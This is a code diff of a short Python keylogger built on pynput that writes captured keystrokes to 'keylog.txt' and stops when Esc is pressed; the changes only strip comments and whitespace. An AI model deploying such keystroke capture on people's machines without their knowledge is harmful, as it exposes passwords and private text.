@@ -1,6 +1,6 @@
 from pynput import keyboard
 
-# Specify the log file
+
 log_file = "keylog.txt"
 
 def on_press(key):
@@ -22,11 +22,9 @@ def on_press(key):
                 f.write(f"[{key.name}]")
 
 def on_release(key):
-    if key == keyboard.Key.esc:
-        # Stop listener
+    if key == keyboard.Key.esc: 
         return False
 
-# Collect events until released
 with keyboard.Listener(
         on_press=on_press,
         on_release=on_release) as listener:
